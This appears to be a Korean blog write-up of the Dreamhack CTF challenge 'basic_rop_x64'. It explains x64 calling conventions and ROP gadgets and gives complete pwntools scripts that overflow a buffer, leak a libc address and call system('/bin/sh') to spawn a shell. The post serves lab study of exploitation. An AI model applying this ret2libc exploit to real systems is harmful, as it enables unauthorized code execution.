---
published: true
image: /img
layout: post
title: Dreamhack 시스템 해킹 basic_rop_x64
tags: [Dreamhack, pwnable, ctf, writeup]
math: true
date: 2022-05-21 21:00
---

이번에 풀어볼 문제는 기존의 32비트 환경 pwn이 아니라 64비트 환경 pwn이다. 기본적으로 32비트와 64비트는 함수 호출 규약에 다른점이 있다. 기존 32비트 환경에서는 함수 실행에 필요한 인자들을 스택에 저장해 하나씩 불러와 사용한다면 64비트 환경은 레지스터에 먼저 저장한 후 레지스터보다 많은 인자가 필요하면 스택을 이용한다.

이러한 차이점으로 32비트 환경에서는 버퍼 오버플로우 등으로 덮어 씌우기만 하면 성공했던 시스템 해킹이 64비트로 오면서 gadget(가젯)을 이용해 함수 실행에 필요한 인자를 넣어줘야 한다


이번 문제는 ROP(Return-oriented programming)에 관한 문제이며 이 ROP 기법은 공격자가 실행 공간 보호(NXbit) 및 코드 서명(Code signing)과 같은 보안 방어가있는 상태에서 코드를 실행할 수있게 해주는 기술이다.

우선 위에서 함수에 사용될 인자를 레지스터에 저장하기 위해 가젯이 필요하다고 했다. 가젯을 설명하기 전에 인자에 저장에 사용되는 레지스터 순서를 먼저 살펴보자

```
+----------------------------------------------+
|   인텔 리눅스 64bit    |      윈도우 64bit     |
|                       |                       |
|        RDI            |           RCX         |
|        RSI            |           RDX         |
|        RDX            |           R8          |
|        RCX            |           R9          |
|        R8             |                       | 
|        R9             |                       |
+----------------------------------------------+
```
위 순서대로 레지스터에 값을 저장하며 이에 필요한 명령어 집합을 가젯이라 한다.

예를 들어 puts 함수는 인자를 1개 가지며 RDI에 인자를 넣아야 한다. 이에 사용되는 가젯은 다음과 같다.
```
pop rdi ; ret
```
위 가젯을 이용해 RSP의 값을 POP해 RDI로 넣어주는 과정이다.

이제 문제로 돌아가 문제 코드를 살펴보자.
```c++
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

위와 같은 구조를 가지고 있으며, 0x40 크기의 버퍼에 0x400의 값을 쓸 수 있어 버퍼 오버플로우를 통한 ROP가 가능하다.

우선 gdb의 info function을 통해 내장되어 있는 함수를 보자

```c++
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
0x0000000000400590  _init
0x00000000004005c0  puts@plt
0x00000000004005d0  write@plt
0x00000000004005e0  alarm@plt
0x00000000004005f0  read@plt
0x0000000000400600  __libc_start_main@plt
0x0000000000400610  signal@plt
0x0000000000400620  setvbuf@plt
0x0000000000400630  exit@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  alarm_handler
0x000000000040075e  initialize
0x00000000004007ba  main
0x0000000000400820  __libc_csu_init
0x0000000000400890  __libc_csu_fini
0x0000000000400894  _fini
```

write는 인자를 3개 필요로 해 데이터를 출력하는데 puts 함수를 사용할 것이다.

이제 함수를 사용하기 위한 가젯을 찾아야 하는데 ROPgadget --binary basic_rop_x64 | grep rdi 명령어로 가능하다. 결과는 다음과 같다.

```c++
/file# ROPgadget --binary basic_rop_x64 | grep rdi 
0x0000000000400726 : cmp dword ptr [rdi], 0 ; jne 0x400730 ; jmp 0x4006c0
0x0000000000400725 : cmp qword ptr [rdi], 0 ; jne 0x400730 ; jmp 0x4006c0
0x0000000000400883 : pop rdi ; ret
```

우리가 필요로 하는 가젯의 주소는 0x0000000000400883이다.

이제 어떤식으로 익스를 작성할지 고민해보자.
pop명령어는 RSP의 주소에 들어있는 값을 RDI로 불러온다. gdb를 통해 확인해보면, read함수를 실행하는 중 RSP의 값은 ret+8의 주소를 가리키고 있다.

따라서 ret에 가젯 주소를, 그 다음으로 계속 변하는 libcbase의 주소를 구하기 위해 read함수의 got를 출력하기 위해 disas main을 통해 찾은 read@got 값을 넣어준다.

그 다음으로 puts을 실행하기 위해 puts@plt 값을 주어 인자로 준 read@got의 실제 주소를 puts함수를 통해 출력한다. 이후 main함수 주소를 추가해 익스플로잇 작성을 위해 main으로 다시 돌아온다.

스택 구조로 보면 다음과 같다. 스택은 위에서 아래가 아닌 아래 베이스 포인터에서 위로 쌓이는걸 고려해 보아야 한다.

```
puts@plt
read@got
gadget
sfp[8바이트] -> 임의 값
'입력 값'
```

따라서 임의 값으로 0x40 + 0x8(64비트 환경은 ret과 sfp 길이가 8바이트)만큼 sfp영역까지 덮어 씌운다. 다음 가젯 주소를 추가하고 read@got와 puts@plt를 추가한다

여기까지 파이썬 코드로 표현하면 다음과 같다.

```python
from pwn import *

conn = remote("host1.dreamhack.games", 13516);
libc=ELF('./libc.so.6')


rdi_ret = 0x400883  #가젯 주소
read_got = 0x601030
puts_plt = 0x4005c0

func_main = 0x4007ba

payload = b'A'*(0x48)
payload += p64(rdi_ret)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(func_main)

conn.send(payload)
sleep(1)

print(conn.recvuntil('A'*0x40))
```

위 코드를 실행하면 puts을 통해 read@got가 출력된 후 다시 main 함수로 돌아온다. 이제 출력된 read@got의 실제 메모리상 주소를 통해 libcbase를 구해보자. read 함수 부분은 다시 공격할 것이다.

문제를 보면 libc.so.6 파일을 같이 첨부해준다.

이를 통해 read@got의 상대주소를 알아내고 출력된 read@got의 실제주소 - 상대주소 를 통해 libc 베이스 주소를 구한다.

다음으로 system 함수를 사용해 /bin/sh를 실행하기 위해 libc에서 system 함수의 상대주소를 구하고 libcbase와 더해 실행중인 프로그램의 메모리 상 system 함수 주소를 구한다.

이후 libc에서 /bin/sh의 문자열 주소를 찾는다.

다음 처음과 마찬가지로 가젯을 통해 systme 함수의 인자로 사용될 /bin/sh의 주소와 system 함수의 주소를 넣어 쉘을 익스 한다.

이 과정을 파이썬 코드로 나타내면 다음과 같다.

```python
from pwn import *

conn = remote("host1.dreamhack.games", 13516);
libc=ELF('./libc.so.6')


rdi_ret = 0x400883
read_got = 0x601030
puts_plt = 0x4005c0

func_main = 0x4007ba

payload = b'A'*(0x48)
payload += p64(rdi_ret)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(func_main)


conn.send(payload)

sleep(1)

print(conn.recvuntil('A'*0x40))

leak = u64(conn.recv(6)+b'\x00\x00')
print("leak => "+str(hex(leak)))

libcbase = leak - libc.sym['read']
print("libcbase => "+str(hex(libcbase)))

system = libcbase+libc.sym['system']
print("system => "+str(hex(system)))

binsh = libcbase+list(libc.search(b"/bin/sh"))[0]
print("binsh => "+str(hex(binsh)))

payload2 = b'B'*0x48
payload2 += p64(rdi_ret)
payload2 += p64(binsh)
payload2 += p64(system)

conn.send(payload2)
conn.interactive()
```

위 코드를 통해 flag를 얻을 수 있다.